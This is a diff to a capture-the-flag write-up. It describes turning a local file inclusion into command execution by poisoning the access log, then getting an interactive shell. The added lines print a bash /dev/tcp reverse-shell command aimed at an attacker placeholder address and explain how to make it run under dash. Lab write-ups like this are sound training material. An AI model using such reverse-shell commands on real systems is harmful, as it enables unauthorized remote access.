@@ -59,7 +59,7 @@ Then I included the access log through the LFI (as a plain include, not through 
 
 With the payload in place, adding `&cmd=` to the URL ran commands as `www-data`. It sometimes took a couple of refreshes to take effect.
 
-From there I used a reverse shell to get an interactive session. I tried more than one form of the reverse-shell command; the one that worked wrapped it in `bash -c '...'`.I am still working out exactly why the other form failed, and will update this once I am sure. I caught the shell with a `netcat` listener and landed as `www-data`, then read the flag.
+From there I used a reverse shell to get an interactive session. The plain `bash -i >& /dev/tcp/<my-ip>/4444 0>&1` reverse shell from `revshells.com` did not work. The reason is that PHP’s `system()` runs commands through `/bin/sh`, which on this box is dash, not bash, and the `>&` redirection and `/dev/tcp` device are bash features that dash does not support. Wrapping the command in `/bin/bash -c '...'` fixed it, because that forces bash itself to interpret the reverse-shell string. I caught the shell with a `netcat` listener and landed as `www-data`, then read the flag.
 
 ## Privilege escalation to archangel (cron + writable script)
 
